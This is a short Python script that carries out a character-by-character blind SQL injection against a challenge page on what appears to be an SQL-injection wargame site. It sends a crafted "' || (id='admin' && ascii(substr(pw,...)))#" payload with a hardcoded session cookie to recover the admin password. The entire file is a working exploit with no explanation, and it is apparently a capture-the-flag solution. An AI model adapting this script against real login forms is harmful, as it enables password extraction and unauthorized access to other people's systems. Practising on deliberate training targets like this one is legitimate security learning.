import requests
import string

cookies = {'PHPSESSID' :'nc39vn3k5l9dspn7mr23h9ugue'}
params = {'pw' : None}
url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"

answer = ''
for i in range(1,9):
    for j in string.printable:
        payload = "' || (id='admin' && ascii(substr(pw,{},1))={})#".format(i,ord(j))
        params['pw'] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello admin" in response.text):
            print(payload)
            answer += j
            break
print(answer)